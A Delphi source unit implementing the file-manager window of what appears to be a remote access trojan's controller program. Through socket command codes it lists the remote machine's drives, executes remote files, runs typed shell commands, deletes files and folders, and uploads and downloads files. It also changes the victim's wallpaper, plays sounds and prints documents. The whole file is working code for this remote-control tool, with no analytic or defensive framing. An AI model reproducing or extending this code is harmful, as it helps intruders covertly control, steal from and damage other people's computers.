unit FileMunit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, OutlookBtn;

type
  TfileM = class(TForm)
    CaptionLabel: TLabel;
    fisiere: TListBox;
    path: TLabel;
    OutlookBtn1: TOutlookBtn;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    OutlookBtn4: TOutlookBtn;
    OutlookBtn5: TOutlookBtn;
    OutlookBtn6: TOutlookBtn;
    OutlookBtn7: TOutlookBtn;
    OutlookBtn8: TOutlookBtn;
    OutlookBtn9: TOutlookBtn;
    OutlookBtn10: TOutlookBtn;
    OutlookBtn11: TOutlookBtn;
    OutlookBtn12: TOutlookBtn;
    OutlookBtn13: TOutlookBtn;
    stat: TLabel;
    OutlookBtn14: TOutlookBtn;
    OpenUpFile: TOpenDialog;
    OutlookBtn15: TOutlookBtn;
    OutlookBtn16: TOutlookBtn;
    bbutton: TFlatSpeedButton;
    CloseButton: TFlatSpeedButton;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure fisiereDblClick(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure OutlookBtn5Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure OutlookBtn7Click(Sender: TObject);
    procedure OutlookBtn9Click(Sender: TObject);
    procedure OutlookBtn11Click(Sender: TObject);
    procedure OutlookBtn12Click(Sender: TObject);
    procedure OutlookBtn10Click(Sender: TObject);
    procedure OutlookBtn13Click(Sender: TObject);
    procedure OutlookBtn6Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn8Click(Sender: TObject);
    procedure OutlookBtn14Click(Sender: TObject);
    procedure OutlookBtn15Click(Sender: TObject);
    procedure OutlookBtn16Click(Sender: TObject);
    procedure bbuttonClick(Sender: TObject);
    procedure bbuttonMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    FromFindFiles:boolean;
    procedure SetTheColors;
    procedure RefreshFM;
  end;

var
  fileM: TfileM;

implementation

uses MainUnit, showmessageunit, AnimUnit, GetPathUnit, BookMarkUnit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TfileM.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with fileM,msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with fileM,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TfileM.SetTheColors;
begin
// myShape.Brush.Color:=cFormBackground;
// myShape.Pen.Color:=cFormLine;
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with BButton do begin
  Color:=cFormBackground;
  ColorBorder:=cButtonBorder;
  Font.Color:=cFormText;
  ColorDown:=cButtonOverFill;
  ColorFocused:=cButtonOverFill;
  ColorHighlight:=cButtonBorder;
  ColorShadow:=cButtonBorder;
 end;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
 end;
 path.Color:=cFormForeground;path.Font.Color:=cFormText;
 Fisiere.Color:=cFormForeground;Fisiere.Font.Color:=cFormText;
 Stat.Font.Color:=cFormText;Stat.Color:=cFormForeground;
 Invalidate;
end;

procedure TfileM.FormCreate(Sender: TObject);
begin
 SetTheColors;
 FromFindFiles:=False;
 Tag:=2;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
end;

procedure TfileM.CloseButtonClick(Sender: TObject);
begin
 Hide;
end;

procedure TfileM.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TfileM.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TfileM.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TfileM.RefreshFM;
begin
if MainForm.Connected then begin
  FromFindfiles:=False;
  if MainForm.NotPassedVersionCheck('1.3') then exit;
  MainForm.InitiateTransfer;
  MainForm.ClientSocket.Socket.SendText('RSH'+path.Caption);
  MainForm.Status.Caption:='refreshing...';
  Stat.Caption:=MainForm.Status.Caption;
end else MainForm.Status.Caption:=NotConnected;
end;

procedure TfileM.OutlookBtn1Click(Sender: TObject);
begin
 RefreshFM;
end;

procedure TfileM.fisiereDblClick(Sender: TObject);
var sclicked,nextdir:string;
    i,ati:integer;
    LocalPath:String;
begin
 LocalPath:=path.Caption;
 with Fisiere do sclicked:=Items[ItemIndex];
 if copy(sclicked,1,1)='<' then
  begin
   Fisiere.Items.Clear;
   nextdir:=copy(sclicked,2,length(sclicked)-2);
   if nextdir<>'..' then LocalPath:=LocalPath+'\'+nextdir
    else begin
   ati:=0;
   for i:=length(LocalPath) downto 1 do
     if (copy(LocalPath,i,1)='\') then begin ati:=i;break;end;
    LocalPath:=copy(LocalPath,1,ati-1);
   end;
   Path.Caption:=LocalPath;
   RefreshFM;
  end;
end;

procedure TfileM.OutlookBtn3Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('FMX'+fisier,'executing file...','1.0');
end;

procedure TfileM.OutlookBtn5Click(Sender: TObject);
var getstr:string;
begin
GetTextForm.GetText('manual command','command:','',false,GetStr);
If GetStr<>'' then
  MainForm.SendCommand('COM'+GetStr,'executing command...','1.0');
end;

procedure TfileM.OutlookBtn4Click(Sender: TObject);
var getstr:string;
begin
GetTextForm.GetText('you can type manually a new path','path:','',false,GetStr);
If GetStr<>'' then
 begin
  if GetStr[length(GetStr)]='\' then GetStr:=Copy(GetStr,1,length(GetStr)-1);
  Path.Caption:=GetStr;
  RefreshFM;
 end;
end;

procedure TfileM.OutlookBtn7Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('FMS'+fisier,'gettin'' file size...','1.0');
end;

procedure TfileM.OutlookBtn9Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (sclicked='<..>')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE or a FOLDER before clicking that button.');
   exit;
  end;
  if (not FromFindFiles) then
   begin
    if sclicked[1]<>'<' then fisier:=Path.Caption+'\'+sclicked
     else fisier:=Path.Caption+'\'+copy(sclicked,2,length(sclicked)-2);
   end else
   fisier:=sclicked;
  if MainForm.AreYouSure('erase '+sclicked+'. are you sure?') then
   begin
    if (copy(sclicked,1,1)='<') then
    MainForm.SendCommand('FM2'+fisier,'deleting folder...','2.1') else
    MainForm.SendCommand('FMD'+fisier,'deleting file...','1.3');
   end; 
end;

function Este(fis,ext1,ext2:string):Boolean;
var ext:string;
    res:boolean;
begin
 ext:=copy(fis,length(fis)-2,3);
 if (UpperCase(ext)=UpperCase(ext1)) or (UpperCase(ext)=UpperCase(ext2))
  then res:=True else Res:=False;
Result:=Res;
end;

procedure TfileM.OutlookBtn11Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if not Este(sclicked,'WAV','WAV') then begin
   MainForm.ShowMsg('you have to click on a WAV file...');exit;end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('FMP'+fisier,'playing file...','1.0');
end;

procedure TfileM.OutlookBtn12Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if not Este(sclicked,'BMP','JPG') then begin
   MainForm.ShowMsg('you have to click on a BMP or JPG file...');exit;end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('FMW'+fisier,'changing wallpaper...','1.0');
end;

procedure TfileM.OutlookBtn10Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if not Este(sclicked,'TXT','RTF') then begin
   MainForm.ShowMsg('you have to click on a TXT or RTF file...');exit;end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('PTF'+fisier,'printing file...','1.8');
end;

procedure TfileM.OutlookBtn13Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
  if (not Este(sclicked,'BMP','JPG')) and (not Este(sclicked,'JPEG','GIF')) and (not Este(sclicked,'WMF','ICO')) and (not Este(sclicked,'EMF','EMF')) then
   begin MainForm.ShowMsg('the file has to be BMP,JPG,GIF,ICO,EMF or WMF');exit;end;
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
  MainForm.SendCommand('FMZ'+fisier,'displaying file...','1.0');
end;

procedure TfileM.OutlookBtn6Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
 if (not FromFindFiles) then MainForm.DownloadingFile:=sclicked
  else MainForm.DownloadingFile:=ExtractFileName(sclicked);
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
 if MainForm.Connected then begin
  MainForm.InitiateTransfer;
  MainForm.ClientSocket.Socket.SendText('NTF'+fisier);
  MainForm.Status.Caption:='downloading file...';
  fileM.Stat.Caption:=MainForm.Status.Caption;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TfileM.OutlookBtn2Click(Sender: TObject);
begin
if (MainForm.DriversLoaded) then
 begin
  Anim.Animeaza(GetNewPath);
  exit;
 end;
 MainForm.SendCommand('GDR','gettin'' all available drives...','1.3');
end;

procedure TfileM.OutlookBtn8Click(Sender: TObject);
var fis:string;
begin
 {MainForm.ShowMsg('the upload feature has been disabled. use the [ftp feature] to upload files');}
 if MainForm.Connected then begin
  if not OpenUpFile.Execute then exit;
  MainForm.StartAnimation;
  MainForm.CeSaTrimita:=OpenUpFile.FileName;
  fis:=MainForm.CeSaTrimita;
  fis:=ExtractFileName(fis);
  if Path.Caption[length(Path.Caption)]<>'\' then fis:='\'+fis;
  MainForm.ClientSocket.Socket.SendText('RTF'+Path.Caption+fis);
{  mainform.showmsg(path.caption+fis);}
  MainForm.Status.Caption:='initiating file transfer...';
  fileM.Stat.Caption:=MainForm.Status.Caption;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TfileM.OutlookBtn14Click(Sender: TObject);
begin
 Path.Caption:='C:';
 RefreshFM;
end;

procedure TfileM.OutlookBtn15Click(Sender: TObject);
var sclicked,fisier:String;
begin
 sclicked:=Fisiere.Items[Fisiere.ItemIndex];
 if (copy(sclicked,1,1)='<')
  then begin
   MainForm.ShowMsg('you gotta click on a FILE before clicking that button.');
   exit;
  end;
 if (not FromFindFiles) then MainForm.DownloadingFile:=sclicked
  else MainForm.DownloadingFile:=ExtractFileName(sclicked);
  if (not FromFindFiles) then
   fisier:=Path.Caption+'\'+sclicked else
   fisier:=sclicked;
 if MainForm.Connected then begin
  MainForm.InitiateTransfer;
  MainForm.ClientSocket.Socket.SendText('NTF'+fisier);
  MainForm.Status.Caption:='reading file...';
  fileM.Stat.Caption:=MainForm.Status.Caption;
  MainForm.DoEditFile:=True;
  MainForm.EditFromFile:=fisier;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TfileM.OutlookBtn16Click(Sender: TObject);
var getstr:string;
begin
 GetTextForm.GetText('create new folder','folder:','',false,GetStr);
 if GetStr='' then exit;
 MainForm.SendCommand('MNF'+path.caption+'\'+GetStr,'creating folder...','2.1');
end;

procedure TfileM.bbuttonClick(Sender: TObject);
begin
 Anim.Animeaza(Bookmarks);
end;

procedure TfileM.bbuttonMouseDown(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 if Button=mbRight then Bookmarks.BookmarkList.Items.Add(Path.Caption);
end;

procedure TfileM.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TfileM.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
